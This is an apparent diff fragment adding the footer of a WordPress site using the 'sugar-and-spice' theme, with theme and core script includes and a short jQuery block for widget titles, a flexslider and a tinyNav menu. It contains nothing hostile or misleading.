+                                <a href="http://www.qingxinzui.com/">清心醉</a>
+            </div><!-- .site-info -->
+        </footer>
+
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/js/skip-link-focus-fix.js?ver=20130115'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/js/modernizr.min.js?ver=2.6.2'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/js/tinynav.min.js?ver=1.1'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-includes/js/comment-reply.min.js?ver=4.5.13'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-content/themes/sugar-and-spice/js/jquery.flexslider-min.js?ver=2.2.0'></script>
+<script type='text/javascript' src='http://www.qingxinzui.com/wp-includes/js/wp-embed.min.js?ver=4.5.13'></script>
+        <script>
+
+        jQuery(document).ready(function($) {
+            $('.widget-title').each(function() {
+                var $this = $(this);
+                $this.html($this.html().replace(/(\S+)\s*$/, '<em>$1</em>'));
+            });
+            $('#reply-title').addClass('section-title').wrapInner('<span></span>');
+
+            if( $('.flexslider').length ) {
+                $('.flexslider').flexslider({ directionNav: false, pauseOnAction: false, });
+                $('.flex-control-nav').each(function(){
+                    var $this = $(this);
+                    var width = '-'+ ($this.width() / 2) +'px';
+                    console.log($this.width());
+                    $this.css('margin-left', width);
+                });
+            }
+
+            $("#nav").tinyNav({header: 'Menu'});
+        });
+        </script>
+    
+</body>
+</html>
